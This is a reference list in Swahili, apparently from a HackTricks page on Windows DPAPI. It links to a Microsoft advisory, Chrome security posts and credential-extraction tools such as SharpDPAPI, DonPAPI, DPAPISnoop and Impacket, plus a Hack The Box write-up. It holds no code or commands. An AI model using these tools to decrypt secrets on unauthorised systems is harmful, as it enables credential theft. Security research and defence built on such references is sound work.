- [4] [CVE-2023-36004 - Udhaifu wa Spoofing katika Windows DPAPI (Data Protection Application Programming Interface)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Kuboresha usalama wa vidakuzi vya Chrome kwenye Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Utoaji rahisi wa entropy ya hiari ya DPAPI](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [Maelezo ya toleo la hashcat v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – hazina ya GitHub](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – ukurasa wa mradi wa PyPI](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: Matumizi mabaya ya AD ACL, kuvunja Argon2 ya KeePassXC, na usimbuaji wa DPAPI hadi kupata admin wa DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Matumizi na chaguo](https://github.com/GhostPack/SharpDPAPI)
- [13] [CyberStrikeAI porini: matumizi ya AI katika mashambulizi halisi dhidi ya mashirika](https://securelist.com/tr/cyberstrikeai-attacks/121715)
- [14] [Microsoft Learn - Hifadhi data iliyosimbwa ya Report Server](https://learn.microsoft.com/en-us/sql/reporting-services/install-windows/ssrs-encryption-keys-store-encrypted-report-server-data?view=sql-server-ver16)
- [15] [Microsoft Learn - Faili ya usanidi ya RSReportServer.config](https://learn.microsoft.com/en-us/sql/reporting-services/report-server/rsreportserver-config-configuration-file?view=sql-server-ver17)
{{#include ../../banners/hacktricks-training.md}}
